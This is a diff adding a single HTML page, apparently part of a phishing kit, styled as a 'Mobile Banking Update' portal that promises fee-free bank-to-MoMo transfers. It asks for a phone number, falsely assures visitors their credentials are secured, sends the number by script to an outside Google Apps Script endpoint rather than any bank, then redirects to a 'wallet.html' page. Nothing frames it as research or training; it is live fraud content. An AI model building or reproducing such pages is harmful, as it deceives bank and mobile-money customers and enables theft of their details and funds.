@@ -1,0 +1,150 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title>Mobile Banking Update</title>
+
+<style>
+
+body{
+margin:0;
+font-family:Arial, sans-serif;
+background:#D4AF37;
+display:flex;
+justify-content:center;
+align-items:center;
+height:100vh;
+color:grey;
+}
+
+.container{
+background:white;
+padding:40px;
+border-radius:12px;
+width:400px;
+text-align:center;
+box-shadow:0px 4px 10px rgba(0,0,0,0.1);
+}
+
+h1{
+color:grey;
+margin-bottom:10px;
+font-weight:bold;
+}
+
+h3{
+color:grey;
+font-weight:normal;
+font-size:16px;
+margin-bottom:30px;
+}
+
+label{
+display:block;
+margin-bottom:10px;
+font-weight:bold;
+color:grey;
+text-align:left;
+}
+
+input{
+width:100%;
+padding:12px;
+border-radius:6px;
+border:1px solid grey;
+margin-bottom:20px;
+font-size:16px;
+}
+
+button{
+background:grey;
+color:white;
+padding:12px;
+width:100%;
+border:none;
+border-radius:6px;
+font-size:16px;
+cursor:pointer;
+}
+
+button:hover{
+background:#555;
+}
+
+.footer{
+margin-top:20px;
+font-size:13px;
+color:grey;
+}
+
+</style>
+</head>
+
+<body>
+
+<div class="container">
+
+<h1><b>MOBILE BANKING UPDATE</b></h1>
+
+<h3>
+Validating your phone number to the account enables you to make transactions
+from Bank to MoMo or vice versa without any fees associated
+</h3>
+
+<form id="phoneForm">
+
+<label>Phone Number</label>
+
+<input
+type="tel"
+id="phone"
+placeholder="Enter your phone number"
+required
+pattern="[0-9]{10,15}"
+>
+
+<button type="submit">Submit</button>
+
+</form>
+
+<div class="footer">
+2026 Mobile Banking Update Portal. Your credentials are secured.
+</div>
+
+</div>
+
+<script>
+
+const scriptURL =
+"https://script.google.com/macros/s/AKfycbweWgY9xqZLXQmsSPeU-e61CS8UqquwYfWU-1DcdlACoKoFfXJtrfSlwTwFxFLKePIV/exec";
+
+document.getElementById("phoneForm").addEventListener("submit", function(e){
+
+e.preventDefault();
+
+const phone=document.getElementById("phone").value;
+
+fetch(scriptURL,{
+method:"POST",
+mode:"no-cors",
+headers:{
+"Content-Type":"application/json"
+},
+body:JSON.stringify({
+phone:phone
+})
+})
+.then(()=>{
+
+window.location.href="wallet.html";
+
+});
+
+});
+
+</script>
+
+</body>
+</html>
